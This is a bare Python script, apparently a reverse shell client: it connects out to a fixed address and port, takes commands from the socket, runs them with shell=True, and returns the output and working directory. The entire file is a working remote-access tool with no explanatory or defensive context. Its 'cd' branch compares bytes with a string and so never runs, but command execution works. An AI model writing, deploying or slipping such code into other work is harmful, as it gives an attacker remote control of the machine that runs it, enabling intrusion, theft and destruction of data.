import os
import socket
import subprocess

s = socket.socket()
host = "192.168.1.124"
port = 9985
s.connect((host, port))

while True:
    data = s.recv(1024)
    rawcmd = data[:].decode("utf-8")
    if data[:2] == "cd":
        os.chdir(data[3:].decode("utf-8"))
        s.send(str.encode(str(os.getcwd()) + "> "))
    if len(data) > 0:
        cmd = subprocess.Popen(rawcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))

s.close()